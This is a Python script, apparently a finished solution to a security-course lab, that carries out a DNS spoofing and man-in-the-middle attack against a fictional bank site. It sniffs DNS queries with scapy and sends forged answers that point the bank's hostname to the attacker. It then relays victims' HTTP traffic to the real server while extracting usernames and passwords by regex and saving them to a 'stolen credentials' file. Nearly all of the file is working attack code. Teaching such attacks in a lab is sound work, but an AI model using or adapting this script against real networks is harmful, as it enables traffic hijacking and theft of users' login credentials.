import os
import argparse
import socket
import re
from scapy.all import *

conf.L3socket = L3RawSocket
WEB_PORT = 8000
HOSTNAME = "LetumiBank.com"
BUFF_SIZE = 16384
DEBUG = False


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def resolve_hostname(hostname):
    # IP address of HOSTNAME. Used to forward tcp connection.
    # Normally obtained via DNS lookup.
    return "127.1.1.1"


def log_credentials(username, password):
    # Write stolen credentials out to file.
    # Do not change this.
    with open("lib/StolenCreds.txt", "wb") as fd:
        fd.write(str.encode("Stolen credentials: username=" +
                            username + " password=" + password))


def check_credentials(client_data):
    # Take a block of client data and search for username/password credentials.
    # If found, log the credentials to the system by calling log_credentials().
    regex = r'username=\'?([^\s\\\'\"]+)\'?\s*&\s*password=\'?([^\s\\\'\"]+)\'?(\r\n|\r|\n)?'
    # Match regex over multiple lines.
    matches = re.findall(regex, client_data, re.M)
    for match in matches:
        log_credentials(match[0], match[1])
        DEBUG and print(
            f'{bcolors.WARNING}username={match[0]}, password={match[1]}{bcolors.ENDC}')


def handle_tcp_forwarding(client_socket, client_ip, hostname):
    # Continuously intercept new connections from the client
    # and initiate a connection with the host in order to forward data
    if DEBUG:
        i = 0
    while True:

        # accept a new connection from the client on client_socket and
        # create a new socket to connect to the actual host associated with hostname.
        if DEBUG:
            i += 1
        conn, _ = client_socket.accept()
        DEBUG and print(
            f'Attacker connected to {bcolors.FAIL}victim{bcolors.ENDC} successfully. ({i})')
        # After connection was established connect to the actual bank:
        bank_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        bank_socket.connect((resolve_hostname(HOSTNAME), WEB_PORT))
        DEBUG and print(
            f'Attacker connected to {bcolors.OKGREEN}bank{bcolors.ENDC} successfully. ({i})')

        # read data from client socket, check for credentials, and forward along to host socket.
        # Check for POST to '/post_logout' and exit after that request has completed.
        client_data = conn.recv(BUFF_SIZE)
        check_credentials(str(client_data))

        bank_socket.send(client_data)
        resp = bank_socket.recv(BUFF_SIZE, socket.MSG_WAITALL)
        bank_socket.close()

        conn.send(resp)
        if 'POST /post_logout' in str(client_data):
            conn.close()
            DEBUG and print(
                f'{bcolors.HEADER}{bcolors.BOLD}-- END OF ATTACK --{bcolors.ENDC}')
            exit()


def dns_callback(packet, extra_args):
    # Write callback function for handling DNS packets.
    # Sends a spoofed DNS response for a query to HOSTNAME and calls handle_tcp_forwarding() after successful spoof.
    DEBUG and packet and \
        print(f'{bcolors.OKGREEN}Packet caught:{bcolors.ENDC}\n{packet.__repr__()}')
    if packet.haslayer(DNSQR) and HOSTNAME in str(packet[DNS].qd.qname):
        spoofed = IP(src=packet[IP].dst, dst=packet[IP].src) /\
            UDP(sport=packet[UDP].dport, dport=packet[UDP].sport) /\
            DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, an=DNSRR(rrname=packet[DNS].qd.qname,
                                                                           ttl=32, rdata=extra_args['src_ip']))
        send(spoofed)
        DEBUG and print(
            f'{bcolors.FAIL}{bcolors.BOLD}Spoofed packet sent!{bcolors.ENDC}')
        handle_tcp_forwarding(extra_args['socket'], None, HOSTNAME)
    elif DEBUG and packet:
        print(f'Packet {packet.__repr__()} sent without handling.')


def sniff_and_spoof(source_ip):
    # Open a socket and bind it to the attacker's IP and WEB_PORT.
    # This socket will be used to accept connections from victimized clients.
    try:
        listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listen_sock.bind((source_ip, WEB_PORT))
        listen_sock.listen(1)
        DEBUG and print(
            f'Socket of type {type(listen_sock)} was created successfully and listening on {source_ip}:{WEB_PORT}.')
    except Exception as ex:
        print(f'ERROR: Could not listen on {source_ip}:{WEB_PORT} - {ex}')
        exit()

    # Sniff for DNS packets on the network. Make sure to pass source_ip
    # and the socket you created as extra callback arguments.
    sniff(
        iface='lo',
        prn=lambda packet: dns_callback(packet, {
            'socket': listen_sock,
            'src_ip': source_ip
        }),
        filter='port 53 and udp'
    )


def main():
    parser = argparse.ArgumentParser(
        description='Attacker who spoofs dns packet and hijacks connection')
    parser.add_argument('--source_ip', nargs='?', const=1,
                        default="127.0.0.3", help='ip of the attacker')
    args = parser.parse_args()

    sniff_and_spoof(args.source_ip)


if __name__ == "__main__":
    # Change working directory to script's dir.
    # Do not change this.
    abspath = os.path.abspath(__file__)
    dirname = os.path.dirname(abspath)
    os.chdir(dirname)
    main()
